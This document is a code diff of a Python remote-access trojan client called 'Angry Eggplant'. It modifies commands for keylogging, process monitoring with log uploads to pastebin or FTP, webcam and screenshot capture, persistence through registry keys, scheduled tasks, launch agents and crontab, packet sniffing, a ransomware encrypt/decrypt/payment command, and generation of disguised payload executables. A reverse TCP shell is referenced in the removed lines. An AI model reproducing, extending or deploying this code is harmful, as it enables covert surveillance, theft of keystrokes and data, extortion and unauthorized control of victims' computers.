@@ -1,4 +1,8 @@
 #!/usr/bin/python
+# Angry Eggplant
+# https://github.com/colental/ae
+# Copyright (c) 2017 Daniel Vega-Myhre
+
 
 from __future__ import print_function
 
@@ -37,7 +41,7 @@ def threaded(function):
 class Client():
     """
     Angry Eggplant Client
-    
+
     """
 
     _debug   = bool()
@@ -1407,12 +1411,14 @@ class Client():
             self.debug("{} error: {}".format(self._ps_kill.func_name, str(e)))
 
 
+    @threaded
     def _ps_monitor(self, arg):
         try:
             if not len(self.ps.buffer.getvalue()):
                 self.ps.buffer.write("Time, User , Executable, PID, Privileges\n")
             pythoncom.CoInitialize()
             c = wmi.WMI()
+            self._workers[self._ps_logger.func_name] = self._ps_logger()
             process_watcher = c.Win32_Process.watch_for("creation")
             while True:
                 try:
@@ -1437,12 +1443,13 @@ class Client():
             self.debug("{} error: {}".format(self._ps_monitor.func_name, str(e2)))
 
 
+    @threaded
     def _ps_logger(self, *args, **kwargs):
         try:
             while True:
                 if self.ps.buffer.tell() > self.ps.max_bytes:
                     try:
-                        result  = self._upload_pastebin(self.ps.buffer) if 'ftp' not in args else self._Upload_ftp(self.ps.buffer)
+                        result = self._upload_pastebin(self.ps.buffer) if 'ftp' not in args else self._Upload_ftp(self.ps.buffer)
                         self._task_save('process monitor', result)
                         self.ps.buffer.reset()
                     except Exception as e:
@@ -1453,21 +1460,6 @@ class Client():
                     time.sleep(5)
         except Exception as e:
             self.debug("{} error: {}".format(self._ps_logger.func_name, str(e)))
-
-
-    def _ps_monitor_start(self, *args, **kwargs):
-        try:
-            if self._ps_monitor.func_name not in self._workers or not self._workers.get(self._ps_monitor.func_name).is_alive():
-                self._workers[self._ps_monitor.func_name] = threading.Thread(target=self._ps_monitor, args=args, kwargs=kwargs, name=time.time())
-                self._workers[self._ps_monitor.func_name].daemon = True
-                self._workers[self._ps_monitor.func_name].start()
-            if self._ps_logger.func_name not in self._workers or not self._workers.get(self._ps_logger.func_name).is_alive():
-                self._workers[self._ps_logger.func_name] = threading.Thread(target=self._ps_logger, name=time.time())
-                self._workers[self._ps_logger.func_name].daemon = True
-                self._workers[self._ps_logger.func_name].start()
-            return "Monitoring process creation and uploading logs"
-        except Exception as e:
-            self.debug("{} error: {}".format(self._ps_monitor.func_name, str(e)))
 
 
     def _server_send(self, **kwargs):
@@ -1665,10 +1657,6 @@ class Client():
                         if not worker.is_alive():
                             dead = self._workers.pop(task, None)
                             del dead
-                            if self._keylogger_auto in task:
-                                self._workers[self._keylogger_auto.func_name] = self._keylogger_auto()
-                            elif self.reverse_tcp_shell.func_name in task:
-                                self._workers[self.reverse_tcp_shell.func_name] = self._reverse_tcp_shell()
                     time.sleep(1)
         except Exception as e:
             self.debug('{} error: {}'.format('TaskManager', str(e)))
@@ -1677,7 +1665,7 @@ class Client():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
     def cd(self, path='.'):
         """
-        change current working directory
+        change current working directory - args: pathname
         """
         try:
             if os.path.isdir(path):
@@ -1706,22 +1694,6 @@ class Client():
                 return "Error: path not found"
         except Exception as e2:
             self.debug("{} error: {}".format(self.ls.func_name, str(e2)))
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='ps [args]')
-    def ps(self, args=None):
-        """
-        alias for 'process'
-        """
-        if not args:
-            return self.ps.usage
-        else:
-            cmd, _, action = str(args).partition(' ')
-            if hasattr(self, '_ps_%s' % cmd):
-                try:
-                    return getattr(self, '_ps_%s' % cmd)(action)
-                except Exception as e:
-                    self.debug("{} error: {}".format(self.ps.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
@@ -2005,10 +1977,10 @@ class Client():
             return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
 
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>')
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <path>')
     def upload(self, args):
         """
-        upload file to imgur, pastebin, or ftp server
+        upload file to imgur, pastebin, or ftp server - args: (ftp, imgur, pastebin) file
         """
         try:
             mode, _, source = str(args).partition(' ')
@@ -2023,7 +1995,7 @@ class Client():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
     def webcam(self, args=None):
         """
-        stream the webcam or capture image/video
+        stream the webcam or capture image/video - args: (image, stream, video)
         """
         try:
             if not args:
@@ -2093,19 +2065,11 @@ class Client():
         """
         try:
             if not args or 'help' in args:
-                return '\n    usage: payload -n <name> -i <icon>\n        -e/--executable     - compile a win32/win64 executable\n        -a/--application    - bundle into Mac OS X application \n        -r/--random         - generate random payload name\n        -n/--name [name]    - set a custom payload name\n        -i/--icon [icon]    - select icon {java, flash, pdf}'
-            elif 'remove' in args:
-                output = {}
-                for payload in self._payload:
-                    self._get_delete(payload)
-                    output[payload] = 'removed'
-                    filename = self._payload.pop(payload, None)
-                    del filename
-                return json.dumps(output)
+                return '\n usage: payload <type>\n    type: py, exe, app\n    kwargs:\n\tname: filename\n\ticon: java, flash, pdf\n'
             else:
                 kwargs  = self._get_kwargs(args)
                 kwargs['path'] = self._payload_stager()
-                if any(map(kwargs.__contains__, ['icon','executable','compile','application','app'])):
+                if any(map(kwargs.__contains__, ['exe','app'])):
                     if os.name == 'darwin':
                         path = self._payload_application(**kwargs)
                     else:
@@ -2117,15 +2081,15 @@ class Client():
             return "{} error: {}".format(self.payload.func_name, str(e))
 
 
-    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop/dump>')
+    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <args>')
     def keylogger(self, *args, **kwargs):
         """
-        start/stop/dump the keylogger
+        log user activity / keystrokes - args: start, stop, status, dump
         """
         mode = args[0] if args else None
         if not mode:
             if self.keylogger.func_name not in self._workers:
-                return self.keylogger.usage
+                return self.keylogger.usage + '\n\targs: start, stop, dump'
             else:
                 return self._keylogger_status()
         else:
@@ -2153,13 +2117,13 @@ class Client():
             elif 'status' in mode:
                 return self._keylogger_status()
             else:
-                return self.keylogger.usage
+                return self.keylogger.usage + '\n\targs: start, stop, dump'
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
     def screenshot(self, *args):
         """
-        capture a screenshot from host device
+        capture a screenshot from host device - mode: (ftp, imgur)
         """
         try:
             with mss.mss() as screen:
@@ -2174,7 +2138,7 @@ class Client():
     @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job','powershell_wmi']}, command=True, usage='persistence <add/remove> [method]')
     def persistence(self, args=None):
         """
-        establish persistence to survive reboots
+        establish client persistence - action: add, remove
         """
         try:
             if not args:
@@ -2196,24 +2160,22 @@ class Client():
         return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(Client, '_persistence_add_%s' % m).platforms]))
 
 
-    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
+    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode] [seconds]')
     def packetsniffer(self, args):
         """
-        sniff local network and capture packets
+        capture traffic on local network - mode: (ftp, pastebin)
         """
         try:
+            mode   = None
+            length = None
             cmd, _, action = str(args).partition(' ')
-            if 'start' in cmd:
-                mode   = None
-                length = None
-                for arg in action.split():
-                    if arg.isdigit():
-                        length = int(arg)
-                    elif arg in ('ftp','pastebin'):
-                        mode   = arg
-                self._workers[self.packetsniffer.func_name] = self._get_packets(seconds=length, mode=mode)
-                self._workers[self.packetsniffer.func_name].start()
-                return 'Capturing network traffic for {} seconds'.format(duration)
+            for arg in action.split():
+                if arg.isdigit():
+                    length = int(arg)
+                elif arg in ('ftp','pastebin'):
+                    mode   = arg
+            self._workers[self.packetsniffer.func_name] = self._get_packets(seconds=length, mode=mode)
+            return 'Capturing network traffic for {} seconds'.format(duration)
         except Exception as e:
             return "{} error: {}".format(self.packetsniffer.func_name, str(e))
 
@@ -2221,7 +2183,7 @@ class Client():
     @config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='ps <mode> [args]')
     def ps(self, args=None):
         """
-        process utilities
+        process utilities - args: (block, list, monitor, kill, search)
         """
         try:
             if not args:
@@ -2231,7 +2193,7 @@ class Client():
                 if hasattr(self, '_ps_%s' % cmd):
                     return getattr(self, '_ps_%s' % cmd)(action)
                 else:
-                    return "usage: {}\n\targs: list, search, kill, monitor".format(self.ps.usage)
+                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\targs: name".format(self.ps.usage)
         except Exception as e:
             return "{} error: {}".format(self.ps.func_name, str(e))
 
